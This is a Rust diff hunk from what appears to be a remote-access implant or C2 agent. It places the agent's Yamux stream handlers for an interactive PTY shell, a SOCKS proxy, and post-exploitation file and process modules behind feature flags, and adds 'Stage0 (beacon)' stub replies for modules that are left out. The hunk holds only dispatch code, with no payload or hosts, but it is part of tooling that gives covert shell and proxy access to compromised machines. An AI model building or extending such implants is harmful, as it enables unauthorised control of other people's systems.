@@ -121,15 +121,55 @@ impl Transport for TcpTransport {
                                             
                                             crate::utils::db_print(&format!("[Yamux] Stream {} Type: 0x{:02X}", stream_id, type_buf[0]));
                                             match type_buf[0] {
-                                                0x01 => { 
-                                                    crate::utils::db_print(&format!("[Yamux] Routing to PTY handler (Stream {})", stream_id));
-                                                    let _ = std::io::stdout().flush();
-                                                    crate::pty::handle_stream(stream).await; 
-                                                    crate::utils::db_print(&format!("[Yamux] PTY handler returned (Stream {})", stream_id));
+                                                0x01 => {
+                                                    #[cfg(feature = "pty")]
+                                                    {
+                                                        crate::utils::db_print(&format!("[Yamux] Routing to PTY handler (Stream {})", stream_id));
+                                                        let _ = std::io::stdout().flush();
+                                                        crate::pty::handle_stream(stream).await;
+                                                    }
+                                                    #[cfg(not(feature = "pty"))]
+                                                    {
+                                                        use futures_util::AsyncWriteExt;
+                                                        let mut s = stream;
+                                                        let _ = s.write_all(
+                                                            b"\r\n[!] Interactive terminal (PTY) is not compiled into this agent profile.\r\n",
+                                                        ).await;
+                                                        let _ = s.close().await;
+                                                    }
                                                 }
-                                                0x02 => { crate::socks::handle_stream(stream).await; }
-                                                0x03 => { crate::fs::handle_stream(stream).await; }
-                                                0x04 => { crate::process::handle_stream(stream).await; }
+                                                0x02 => {
+                                                    #[cfg(feature = "socks")]
+                                                    {
+                                                        crate::socks::handle_stream(stream).await;
+                                                    }
+                                                    #[cfg(not(feature = "socks"))]
+                                                    {
+                                                        let _ = stream;
+                                                    }
+                                                }
+                                                0x03 => {
+                                                    #[cfg(feature = "post-ex")]
+                                                    { crate::fs::handle_stream(stream).await; }
+                                                    #[cfg(not(feature = "post-ex"))]
+                                                    {
+                                                        use futures_util::AsyncWriteExt;
+                                                        let mut s = stream;
+                                                        let _ = s.write_all(b"\r\n[!] file module not in Stage0 (beacon)\r\n").await;
+                                                        let _ = s.close().await;
+                                                    }
+                                                }
+                                                0x04 => {
+                                                    #[cfg(feature = "post-ex")]
+                                                    { crate::process::handle_stream(stream).await; }
+                                                    #[cfg(not(feature = "post-ex"))]
+                                                    {
+                                                        use futures_util::AsyncWriteExt;
+                                                        let mut s = stream;
+                                                        let _ = s.write_all(b"\r\n[!] process module not in Stage0 (beacon)\r\n").await;
+                                                        let _ = s.close().await;
+                                                    }
+                                                }
                                                 _ => { crate::utils::db_print(&format!("[Yamux] Unknown type: 0x{:02X}", type_buf[0])); }
                                             }
                                         });
